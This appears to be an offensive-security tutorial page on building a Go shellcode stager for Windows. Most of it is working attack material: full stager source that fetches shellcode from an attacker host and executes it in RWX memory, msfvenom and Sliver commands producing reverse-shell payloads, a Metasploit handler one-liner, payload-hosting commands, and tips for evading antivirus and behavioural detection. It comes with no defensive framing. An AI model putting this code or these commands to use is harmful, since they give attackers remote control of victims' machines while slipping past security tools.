# 07.07 Go Stager

> Cross-compile a Go downloader that fetches shellcode and runs it via `VirtualAlloc` + `syscall.Syscall` in the current process.

## Overview

Go produces statically-linked PE binaries with no runtime dependencies and ships its own scheduler, which results in unusual binary shape (large `.text`, embedded Go runtime symbols) that many signature engines do not have stable detections for. The stager opens HTTP to the attacker server, pulls raw shellcode bytes, allocates RWX memory via `kernel32!VirtualAlloc`, copies the bytes in, and jumps to them via `syscall.Syscall`. Cross-compilation from Linux to Windows is one command (`GOOS=windows GOARCH=amd64 go build`) so the attacker box does not need a Windows toolchain. The binary tends to be a few MB (Go runtime overhead) but is usually missed by AMSI and Defender static scans.

## Steps

- **Step 1** — Install Go on the attacker host (`apt install golang-go` on Kali, or download from `https://go.dev/dl/` for the latest).
- **Step 2** — Generate raw shellcode bytes with `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o shellc.bin` (or use a Sliver shellcode export).
- **Step 3** — Edit `stager.go` and replace the URL with your `<ATTACKER>` IP/hostname and the path where you host the shellcode.
- **Step 4** — Cross-compile from Linux to Windows: `GOOS=windows GOARCH=amd64 go build -ldflags "-w -s -H windowsgui" -o stager.exe stager.go`. `-w -s` strips debug+symbol info; `-H windowsgui` makes it a windowed app (no console window).
- **Step 5** — Host shellcode on the attacker box: `cd /tmp && python3 -m http.server 80` (or any web server). Verify with `curl -o /dev/null -s -w "%{http_code}\n" http://<ATTACKER>/shellc.bin`.
- **Step 6** — Start the C2 handler (Metasploit `multi/handler`, Sliver listener, etc.) and deliver `stager.exe` to the victim.
- **Step 7** — Detection notes: Go binaries are large and have rare-language signatures; AV often misses static scan but the runtime behavior (RWX alloc, executing downloaded buffer) may trip behavioral monitoring. For lower noise, switch to `VirtualProtect` to flip RWX→RX after copying, or use indirect-syscall approach via `golang-syscall-bypass` style libraries.

### stager.go full source

```go
// +build windows

package main

import (
	"io"
	"net/http"
	"syscall"
	"unsafe"
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc = kernel32.NewProc("VirtualAlloc")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func downloadShellcode(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

func executeShellcode(shellcode []byte) {
	addr, _, err := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		panic(err)
	}

	// Copy shellcode into allocated memory
	for i := 0; i < len(shellcode); i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
	}

	// Execute shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	url := "http://<ATTACKER>/shellc.bin"

	shellcode, err := downloadShellcode(url)
	if err != nil {
		panic(err)
	}

	executeShellcode(shellcode)
}
```

### Generate shellcode (msfvenom)

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o shellc.bin
# Or stageless:
# msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o shellc.bin
```

### Generate Sliver shellcode (alternative)

```bash
sliver > generate --format shellcode --mtls <ATTACKER>:8888 --os windows --arch amd64 --save /tmp/shellc.bin
```

### Cross-compile Linux to Windows

```bash
# Compile to Windows x64 from Kali
GOOS=windows GOARCH=amd64 go build -ldflags "-w -s -H windowsgui" -o stager.exe stager.go
# -w -s   = strip debug + symbol tables (smaller binary, less reversing surface)
# -H windowsgui = windowed app, no console pop-up

# x86 build:
GOOS=windows GOARCH=386 go build -ldflags "-w -s -H windowsgui" -o stager_x86.exe stager.go
```

### Host shellcode (attacker box)

```bash
# Drop where the web server can serve it
sudo cp shellc.bin /var/www/html/
# Or simple one-liner web server:
cd /tmp && python3 -m http.server 80
# Verify:
curl -o /dev/null -s -w "%{http_code}\n" http://<ATTACKER>/shellc.bin
```

### Run handler (Metasploit example)

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <ATTACKER>; set LPORT 443; set ExitOnSession false; exploit -j"
```

### OPSEC tweaks (RWX to RX)

```go
// Variant: allocate RW, write shellcode, then flip to RX via VirtualProtect.
// Less noisy for behavioral detection.
var procVirtualProtect = kernel32.NewProc("VirtualProtect")
const PAGE_READWRITE = 0x04
const PAGE_EXECUTE_READ = 0x20

// Allocate RW only:
addr, _, _ := procVirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
// Copy shellcode (same byte loop as above)
// Flip to RX before execution:
var oldProtect uint32
procVirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
syscall.Syscall(addr, 0, 0, 0, 0)
```
